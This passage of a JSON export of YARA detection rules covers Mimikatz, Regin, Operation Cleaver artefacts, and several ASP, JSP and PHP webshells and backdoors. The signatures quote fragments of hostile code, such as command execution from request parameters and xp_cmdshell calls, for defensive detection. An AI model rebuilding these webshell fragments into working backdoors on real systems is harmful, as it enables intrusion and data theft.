license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"d:\\\\nightly\\\\sandbox_avg10_vc9_SP1_2011\\\\source\\\\avg10\\\\avg9_all_vs90\\\\bin\\\\Rele\" ascii\n      $x1 = \"Mozilla/5.0\" fullword ascii\n      $x2 = \"index.php?c=%s&r=%lx&u=1&t=%s\" fullword ascii\n      $x3 = \"index.php?c=%s&r=%lx\" fullword ascii\n      $x4 = \"index.php?c=%s&r=%x\" fullword ascii\n      $x5 = \"127.0.0.1\" fullword ascii\n      $x6 = \"/info.dat\" fullword ascii\n      $z1 = \"Content-Type: multipart/form-data; boundary=%S\" fullword wide\n      $z2 = \"Encountered error sending error message to client\" fullword ascii\n      $z3 = \"Encountered error building error message to client\" fullword ascii\n      $z4 = \"Attempting to unlock uninitialized lock!\" fullword ascii\n      $z5 = \"connect_back_tcp_channel#do_connect:: Error resolving connect back hostname\" fullword ascii\n      $z6 = \"select_event_get(): fd not found\" fullword ascii\n      $z7 = \"Encountered error sending syscall response to client\" fullword ascii\n      $z8 = \"GetProcAddress() error\" fullword ascii\n      $z9 = \"Error entering thread lock\" fullword ascii\n      $z10 = \"Error exiting thread lock\" fullword ascii\n      $z11 = \"connect_back_tcp_channel_init:: socket() failed\" fullword ascii\n      $z12 = \"event_add() failed for ev.\" fullword ascii\n      $z13 = \"Uh, oh, exit() failed\" fullword ascii\n      $z14 = \"event_add() failed for ev.\" fullword ascii\n      $z15 = \"event_add() failed.\" fullword ascii\n      $z16 = \"needroot\" fullword ascii\n      $z17 = \"./plugins/\" fullword ascii\n   condition: \n      $s0 or all of ( $x* ) or 8 of ( $z* )\n}","date":"2014-12-27 12:03:01","description":"Detects a malware sysdll.exe from the Rocket Kitten APT","minimum_yara":"1.7","name":"CoreImpact_sysdll_exe_RID2F93","reference":"-","required_modules":[],"rule_hash":"e758e0de0674ded55ae4e035dc4a1641","score":70,"tags":["APT","DEMO","MIDDLE_EAST"]},{"author":"Florian Roth","content":"rule Mimikatz_Memory_Rule_2_RID2FB7 : DEMO HKTL T1003 T1075 T1097 T1178 {\n   meta:\n      description = \"Mimikatz Rule generated from a memory dump\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-22 12:09:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"memory\"\n      tags = \"DEMO, HKTL, T1003, T1075, T1097, T1178\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"sekurlsa::\" ascii\n      $x1 = \"cryptprimitives.pdb\" ascii\n      $x2 = \"Now is t1O\" ascii fullword\n      $x4 = \"ALICE123\" ascii\n      $x5 = \"BOBBY456\" ascii\n   condition: \n      $s0 and 1 of ( $x* )\n}","date":"2014-12-22 12:09:01","description":"Mimikatz Rule generated from a memory dump","minimum_yara":"1.7","name":"Mimikatz_Memory_Rule_2_RID2FB7","reference":"-","required_modules":[],"rule_hash":"964d12c0ec6e0144aae80b8854fbe2aa","score":80,"tags":["T1178","T1097","T1075","DEMO","T1003","HKTL"]},{"author":"Florian Roth","content":"rule SoakSoak_Infected_Wordpress_RID31D6 : DEMO OFFICE T1100 WEBSHELL {\n   meta:\n      description = \"Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/1GzWUX\"\n      date = \"2014-12-15 13:39:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OFFICE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"wp_enqueue_script(\\\"swfobject\\\");\" ascii fullword\n      $s1 = \"function FuncQueueObject()\" ascii fullword\n      $s2 = \"add_action(\\\"wp_enqueue_scripts\\\", 'FuncQueueObject');\" ascii fullword\n   condition: \n      all of ( $s* )\n}","date":"2014-12-15 13:39:31","description":"Detects a SoakSoak infected Wordpress site http://goo.gl/1GzWUX","minimum_yara":"1.7","name":"SoakSoak_Infected_Wordpress_RID31D6","reference":"http://goo.gl/1GzWUX","required_modules":[],"rule_hash":"ae0273466952fb5899a5eef34cf5121c","score":60,"tags":["T1100","OFFICE","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Weevely_Webshell_RID2D87 : DEMO FILE GEN T1100 WEBSHELL {\n   meta:\n      description = \"Weevely Webshell - Generic Rule - heavily scrambled tiny web shell\"\n      author = \"Florian Roth\"\n      reference = \"http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html\"\n      date = \"2014-12-14 10:35:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, GEN, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = /\\$[a-z]{4} = \\$[a-z]{4}\\(\"[a-z][a-z]?\",[\\s]?\"\",[\\s]?\"/ ascii\n      $s1 = /\\$[a-z]{4} = str_replace\\(\"[a-z][a-z]?\",\"\",\"/ ascii\n      $s2 = /\\$[a-z]{4}\\.\\$[a-z]{4}\\.\\$[a-z]{4}\\.\\$[a-z]{4}\\)\\)\\); \\$[a-z]{4}\\(\\);/ ascii\n      $s4 = /\\$[a-z]{4}=\"[a-zA-Z0-9]{70}/ ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and all of ( $s* ) and filesize > 570 and filesize < 800\n}","date":"2014-12-14 10:35:41","description":"Weevely Webshell - Generic Rule - heavily scrambled tiny web shell","minimum_yara":"1.7","name":"Weevely_Webshell_RID2D87","reference":"http://www.ehacking.net/2014/12/weevely-php-stealth-web-backdoor-kali.html","required_modules":[],"rule_hash":"8990f2659ca78fa1d77339c65ded1593","score":60,"tags":["T1100","DEMO","WEBSHELL","GEN","FILE"]},{"author":"Florian Roth","content":"rule HawkEye_PHP_Panel_RID2D55 : DEMO HKTL T1056 T1100 WEBSHELL {\n   meta:\n      description = \"Detects HawkEye Keyloggers PHP Panel\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-14 10:27:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1056, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$fname = $_GET['fname'];\" ascii fullword\n      $s1 = \"$data = $_GET['data'];\" ascii fullword\n      $s2 = \"unlink($fname);\" ascii fullword\n      $s3 = \"echo \\\"Success\\\";\" fullword ascii\n   condition: \n      all of ( $s* ) and filesize < 600\n}","date":"2014-12-14 10:27:21","description":"Detects HawkEye Keyloggers PHP Panel","minimum_yara":"1.7","name":"HawkEye_PHP_Panel_RID2D55","reference":"-","required_modules":[],"rule_hash":"6afd5d0d01337139d808fa669b16701b","score":60,"tags":["T1100","DEMO","WEBSHELL","T1056","HKTL"]},{"author":"Florian Roth","content":"rule JSP_jfigueiredo_APT_webshell_RID31E3 : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"JSP Browser used as web shell by APT groups - author: jfigueiredo\"\n      author = \"Florian Roth\"\n      reference = \"http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp\"\n      date = \"2014-12-10 13:41:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"String fhidden = new String(Base64.encodeBase64(path.getBytes()));\" ascii\n      $a2 = \"<form id=\\\"upload\\\" name=\\\"upload\\\" action=\\\"ServFMUpload\\\" method=\\\"POST\\\" enctype=\\\"multipart/form-data\\\">\" ascii\n   condition: \n      all of them\n}","date":"2014-12-10 13:41:41","description":"JSP Browser used as web shell by APT groups - author: jfigueiredo","minimum_yara":"1.7","name":"JSP_jfigueiredo_APT_webshell_RID31E3","reference":"http://ceso.googlecode.com/svn/web/bko/filemanager/Browser.jsp","required_modules":[],"rule_hash":"6996bd4798b7bda37d584339f2c5597a","score":60,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule JSP_jfigueiredo_APT_webshell_2_RID3274 : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"JSP Browser used as web shell by APT groups - author: jfigueiredo\"\n      author = \"Florian Roth\"\n      reference = \"http://ceso.googlecode.com/svn/web/bko/filemanager/\"\n      date = \"2014-12-10 14:05:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<div id=\\\"bkorotator\\\"><img alt=\\\"\\\" src=\\\"images/rotator/1.jpg\\\"></div>\" ascii\n      $a2 = \"$(\\\"#dialog\\\").dialog(\\\"destroy\\\");\" ascii\n      $s1 = \"<form id=\\\"form\\\" action=\\\"ServFMUpload\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\">\" ascii\n      $s2 = \"<input type=\\\"hidden\\\" id=\\\"fhidden\\\" name=\\\"fhidden\\\" value=\\\"L3BkZi8=\\\" />\" ascii\n   condition: \n      all of ( $a* ) or all of ( $s* )\n}","date":"2014-12-10 14:05:51","description":"JSP Browser used as web shell by APT groups - author: jfigueiredo","minimum_yara":"1.7","name":"JSP_jfigueiredo_APT_webshell_2_RID3274","reference":"http://ceso.googlecode.com/svn/web/bko/filemanager/","required_modules":[],"rule_hash":"2b0f1798ac5409b6a4a997e7a24ac11d","score":60,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule CN_Hacktool_MilkT_BAT_RID2EAC : DEMO HKTL SUSP {\n   meta:\n      description = \"Detects a chinese Portscanner named MilkT - shipped BAT\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-12-10 11:24:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" ascii\n      $s1 = \"if not \\\"%Choice%\\\"==\\\"\\\" set Choice=%Choice:~0,1%\" ascii\n   condition: \n      all of them\n}","date":"2014-12-10 11:24:31","description":"Detects a chinese Portscanner named MilkT - shipped BAT","minimum_yara":"1.7","name":"CN_Hacktool_MilkT_BAT_RID2EAC","reference":"-","required_modules":[],"rule_hash":"08ed5dd7133b3dd666844d7a828eda3c","score":70,"tags":["SUSP","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_Insomnia_RID2DE4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Insomnia Webshell - file InsomniaShell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/\"\n      date = \"2014-12-09 10:51:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Response.Write(\\\"- Failed to create named pipe:\\\");\" fullword ascii\n      $s1 = \"Response.Output.Write(\\\"+ Sending {0}<br>\\\", command);\" fullword ascii\n      $s2 = \"String command = \\\"exec master..xp_cmdshell 'dir > \\\\\\\\\\\\\\\\127.0.0.1\" ascii\n      $s3 = \"Response.Write(\\\"- Error Getting User Info<br>\\\");\" fullword ascii\n      $s4 = \"string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,\" fullword ascii\n      $s5 = \"[DllImport(\\\"Advapi32.dll\\\", SetLastError = true)]\" fullword ascii\n      $s9 = \"username = DumpAccountSid(tokUser.User.Sid);\" fullword ascii\n      $s14 = \"//Response.Output.Write(\\\"Opened process PID: {0} : {1}<br>\\\", p\" ascii\n   condition: \n      3 of them\n}","date":"2014-12-09 10:51:11","description":"Insomnia Webshell - file InsomniaShell.aspx","minimum_yara":"1.7","name":"Webshell_Insomnia_RID2DE4","reference":"http://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/","required_modules":[],"rule_hash":"cbace10396a58a0b2a7cc226dfbadc96","score":80,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule OPCLEAVER_Parviz_Developer_RID3092 : APT DEMO {\n   meta:\n      description = \"Parviz developer known from Operation Cleaver\"\n      author = \"Florian Roth\"\n      reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n      date = \"2014-12-02 12:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Users\\\\parviz\\\\documents\\\\\" nocase\n   condition: \n      $s1\n}","date":"2014-12-02 12:45:31","description":"Parviz developer known from Operation Cleaver","minimum_yara":"1.7","name":"OPCLEAVER_Parviz_Developer_RID3092","reference":"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf","required_modules":[],"rule_hash":"d698b18bd3ecd3a53b2248580d6d22a7","score":70,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule OPCLEAVER_CCProxy_Config_RID2F6E : APT DEMO HKTL T1090 {\n   meta:\n      description = \"CCProxy config known from Operation Cleaver\"\n      author = \"Florian Roth\"\n      reference = \"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf\"\n      date = \"2014-12-02 11:56:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"UserName=User-001\" fullword ascii\n      $s2 = \"Web=1\" fullword ascii\n      $s3 = \"Mail=1\" fullword ascii\n      $s4 = \"FTP=0\" fullword ascii\n      $x1 = \"IPAddressLow=78.109.194.114\" fullword ascii\n   condition: \n      all of ( $s* ) or $x1\n}","date":"2014-12-02 11:56:51","description":"CCProxy config known from Operation Cleaver","minimum_yara":"1.7","name":"OPCLEAVER_CCProxy_Config_RID2F6E","reference":"http://cylance.com/assets/Cleaver/Cylance_Operation_Cleaver_Report.pdf","required_modules":[],"rule_hash":"70e7f408a1fe6d4601704818a46b7acc","score":70,"tags":["APT","T1090","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule Regin_Sample_3_RID2C59 : APT DEMO FILE MAL T1050 {\n   meta:\n      description = \"Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-27 09:45:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service Pack x\" fullword wide\n      $s1 = \"\\\\REGISTRY\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n      $s2 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\HotFix\" fullword wide\n      $s3 = \"mntoskrnl.exe\" fullword wide\n      $s4 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Memory Management\" fullword wide\n      $s5 = \"Memory location: 0x%p, size 0x%08x\" wide fullword\n      $s6 = \"Service Pack\" fullword wide\n      $s7 = \".sys\" fullword wide\n      $s8 = \".dll\" fullword wide\n      $s10 = \"\\\\REGISTRY\\\\Machine\\\\Software\\\\Microsoft\\\\Updates\" fullword wide\n      $s11 = \"IoGetRelatedDeviceObject\" fullword ascii\n      $s12 = \"VMEM.sys\" fullword ascii\n      $s13 = \"RtlGetVersion\" fullword wide\n      $s14 = \"ntkrnlpa.exe\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0xfedcbafe and all of ( $s* ) and filesize > 160KB and filesize < 200KB\n}","date":"2014-11-27 09:45:21","description":"Detects Regin Backdoor sample fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129","minimum_yara":"1.7","name":"Regin_Sample_3_RID2C59","reference":"-","required_modules":[],"rule_hash":"6b13613577b7791ab5edd68115c8b599","score":70,"tags":["APT","DEMO","T1050","FILE","MAL"]},{"author":"Florian Roth","content":"rule Regin_sig_svcsstat_RID2E82 : APT DEMO {\n   meta:\n      description = \"Detects svcstat from Regin report - file svcsstat.exe_sample\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 11:17:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Service Control Manager\" fullword ascii\n      $s1 = \"_vsnwprintf\" fullword ascii\n      $s2 = \"Root Agency\" fullword ascii\n      $s3 = \"Root Agency0\" fullword ascii\n      $s4 = \"StartServiceCtrlDispatcherA\" fullword ascii\n      $s5 = \"\\\\\\\\?\\\\UNC\" fullword wide\n      $s6 = \"%ls%ls\" fullword wide\n   condition: \n      all of them and filesize < 15KB and filesize > 10KB\n}","date":"2014-11-25 11:17:31","description":"Detects svcstat from Regin report - file svcsstat.exe_sample","minimum_yara":"1.7","name":"Regin_sig_svcsstat_RID2E82","reference":"-","required_modules":[],"rule_hash":"14b579590f609eb92d335baed2c72494","score":70,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule Regin_Sample_2_RID2C58 : APT DEMO T1050 {\n   meta:\n      description = \"Semiautomatic generated rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 09:45:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\SYSTEMROOT\\\\system32\\\\lsass.exe\" fullword wide\n      $s1 = \"atapi.sys\" fullword wide\n      $s2 = \"disk.sys\" fullword wide\n      $s3 = \"IoGetRelatedDeviceObject\" fullword ascii\n      $s4 = \"HAL.dll\" fullword ascii\n      $s5 = \"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\" fullword ascii\n      $s6 = \"PsGetCurrentProcessId\" fullword ascii\n      $s7 = \"KeGetCurrentIrql\" fullword ascii\n      $s8 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n      $s9 = \"KeSetImportanceDpc\" fullword ascii\n      $s10 = \"KeQueryPerformanceCounter\" fullword ascii\n      $s14 = \"KeInitializeEvent\" fullword ascii\n      $s15 = \"KeDelayExecutionThread\" fullword ascii\n      $s16 = \"KeInitializeTimerEx\" fullword ascii\n      $s18 = \"PsLookupProcessByProcessId\" fullword ascii\n      $s19 = \"ExReleaseFastMutexUnsafe\" fullword ascii\n      $s20 = \"ExAcquireFastMutexUnsafe\" fullword ascii\n   condition: \n      all of them and filesize < 40KB and filesize > 30KB\n}","date":"2014-11-25 09:45:11","description":"Semiautomatic generated rule - file hiddenmod_hookdisk_and_kdbg_8949d000.bin","minimum_yara":"1.7","name":"Regin_Sample_2_RID2C58","reference":"-","required_modules":[],"rule_hash":"cf0116df8fdd0628a40c1db4c39f8bc8","score":70,"tags":["APT","DEMO","T1050"]},{"author":"Florian Roth","content":"rule Regin_Sample_Set_2_RID2DE3 : APT DEMO T1050 {\n   meta:\n      description = \"Semiautomatic generated rule - file SHF-000052 and ndisips.sys\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-25 10:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"HAL.dll\" fullword ascii\n      $s1 = \"IoGetDeviceObjectPointer\" fullword ascii\n      $s2 = \"MaximumPortsServiced\" fullword wide\n      $s3 = \"KeGetCurrentIrql\" fullword ascii\n      $s4 = \"ntkrnlpa.exe\" fullword ascii\n      $s5 = \"\\\\REGISTRY\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\" wide\n      $s6 = \"ConnectMultiplePorts\" fullword wide\n      $s7 = \"\\\\SYSTEMROOT\" fullword wide\n      $s8 = \"IoWriteErrorLogEntry\" fullword ascii\n      $s9 = \"KeQueryPerformanceCounter\" fullword ascii\n      $s10 = \"KeServiceDescriptorTable\" fullword ascii\n      $s11 = \"KeRemoveEntryDeviceQueue\" fullword ascii\n      $s12 = \"SeSinglePrivilegeCheck\" fullword ascii\n      $s13 = \"KeInitializeEvent\" fullword ascii\n      $s14 = \"IoBuildDeviceIoControlRequest\" fullword ascii\n      $s15 = \"KeRemoveDeviceQueue\" fullword ascii\n      $s16 = \"IofCompleteRequest\" fullword ascii\n      $s17 = \"KeInitializeSpinLock\" fullword ascii\n      $s18 = \"MmIsNonPagedSystemAddressValid\" fullword ascii\n      $s19 = \"IoCreateDevice\" fullword ascii\n      $s20 = \"KefReleaseSpinLockFromDpcLevel\" fullword ascii\n   condition: \n      all of them and filesize < 40KB and filesize > 30KB\n}","date":"2014-11-25 10:51:01","description":"Semiautomatic generated rule - file SHF-000052 and ndisips.sys","minimum_yara":"1.7","name":"Regin_Sample_Set_2_RID2DE3","reference":"-","required_modules":[],"rule_hash":"ea59dd9cf4e9be722c2bedfdc57c7720","score":70,"tags":["APT","DEMO","T1050"]},{"author":"Florian Roth","content":"rule aspbackdoor_EDIT_RID2D1F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:18:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n      $s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n      $s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n      $s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n      $s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n      $s7 = \"color: rgb(255,0,0); text-decoration: underline }\" fullword ascii\n      $s13 = \"if Request(\\\"creat\\\")<>\\\"yes\\\" then\" fullword ascii\n   condition: \n      5 of them\n}","date":"2014-11-23 10:18:21","description":"Disclosed hacktool set (old stuff) - file EDIT.ASP","minimum_yara":"1.7","name":"aspbackdoor_EDIT_RID2D1F","reference":"-","required_modules":[],"rule_hash":"574e82d970ca7559065e15d1eafb5eab","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule aspbackdoor_entice_RID2E71 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file entice.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:14:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<Form Name=\\\"FormPst\\\" Method=\\\"Post\\\" Action=\\\"entice.asp\\\">\" fullword ascii\n      $s2 = \"if left(trim(request(\\\"sqllanguage\\\")),6)=\\\"select\\\" then\" fullword ascii\n      $s4 = \"conndb.Execute(sqllanguage)\" fullword ascii\n      $s5 = \"<!--#include file=sqlconn.asp-->\" fullword ascii\n      $s6 = \"rstsql=\\\"select * from \\\"&rstable(\\\"table_name\\\")\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 11:14:41","description":"Disclosed hacktool set (old stuff) - file entice.asp","minimum_yara":"1.7","name":"aspbackdoor_entice_RID2E71","reference":"-","required_modules":[],"rule_hash":"5a26fbd0e633333eb339e72823d307c7","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_sig_238_cmd_2_RID2F09 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process child = Runtime.getRuntime().exec(\" ascii\n      $s1 = \"InputStream in = child.getInputStream();\" fullword ascii\n      $s2 = \"String cmd = request.getParameter(\\\"\" ascii\n      $s3 = \"while ((c = in.read()) != -1) {\" fullword ascii\n      $s4 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 11:40:01","description":"Disclosed hacktool set (old stuff) - file cmd.jsp","minimum_yara":"1.7","name":"Webshell_sig_238_cmd_2_RID2F09","reference":"-","required_modules":[],"rule_hash":"7107159672bd9af551b33f201449f635","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspfile2_RID2DBC : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file aspfile2.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:44:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write \\\"command completed success!\\\" \" fullword ascii\n      $s1 = \"for each co in foditems \" fullword ascii\n      $s3 = \"<input type=text name=text6 value=\\\"<%= szCMD6 %>\\\"><br> \" fullword ascii\n      $s19 = \"<title>Hello! Welcome </title>\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 10:44:31","description":"Disclosed hacktool set (old stuff) - file aspfile2.asp","minimum_yara":"1.7","name":"Webshell_aspfile2_RID2DBC","reference":"-","required_modules":[],"rule_hash":"98715c4588eb380ecfa76c75c223fb53","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspbackdoor_EDIR_RID30B2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EDIR.ASP\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 12:50:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n      $s3 = \"if Request.Cookies(\\\"password\\\")=\\\"\" ascii\n      $s6 = \"whichdir=server.mappath(Request(\\\"path\\\"))\" fullword ascii\n      $s7 = \"Set fs = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n      $s19 = \"whichdir=Request(\\\"path\\\")\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 12:50:51","description":"Disclosed hacktool set (old stuff) - file EDIR.ASP","minimum_yara":"1.7","name":"Webshell_aspbackdoor_EDIR_RID30B2","reference":"-","required_modules":[],"rule_hash":"db89228c505bba6761615cbc3090854c","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspbackdoor_asp4_RID3106 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp4.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:04:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system.dll\" fullword ascii\n      $s2 = \"set sys=server.CreateObject (\\\"system.contral\\\") \" fullword ascii\n      $s3 = \"Public Function reboot(atype As Variant)\" fullword ascii\n      $s4 = \"t& = ExitWindowsEx(1, atype)\" ascii\n      $s5 = \"atype=request(\\\"atype\\\") \" fullword ascii\n      $s7 = \"AceiveX dll\" fullword ascii\n      $s8 = \"Declare Function ExitWindowsEx Lib \\\"user32\\\" (ByVal uFlags As Long, ByVal \" ascii\n      $s10 = \"sys.reboot(atype)\" fullword ascii\n   condition: 